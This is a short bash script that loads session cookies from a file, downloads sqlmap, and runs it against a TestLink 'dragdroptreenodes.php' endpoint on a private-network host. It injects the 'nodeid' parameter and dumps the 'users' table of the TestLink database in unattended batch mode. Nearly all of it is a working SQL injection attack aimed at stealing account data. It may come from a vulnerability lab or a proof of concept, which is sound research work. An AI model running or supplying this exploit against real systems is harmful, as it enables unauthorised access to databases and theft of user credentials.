#!/bin/bash

sum=0
declare -a indexed_arr
for line in `cat  temp`
do
    echo $line
    indexed_arr[sum]=$line
    echo ${indexed_arr[sum]}
    sum+=1
done
wget 'https://github.com/sqlmapproject/sqlmap/tarball/master' --output-document=./sqlmapproject-sqlmap.tar.gz
mkdir ./sqlmap && tar -xzvf sqlmapproject-sqlmap.tar.gz -C ./sqlmap --strip-components 1
cd sqlmap
python sqlmap.py --version

python sqlmap.py -u http://192.168.1.19:8001/lib/ajax/dragdroptreenodes.php --data="doAction=changeParent&oldparentid=41&newparentid=41&nodelist=47%2C45&nodeorder=0&nodeid=47" -p nodeid --cookie="PHPSESSID=${indexed_arr[0]};TESTLINK1920TESTLINK_USER_AUTH_COOKIE=${indexed_arr[1]}" --dump -D bitnami_testlink -T users   --answers="follow=Y" --batch
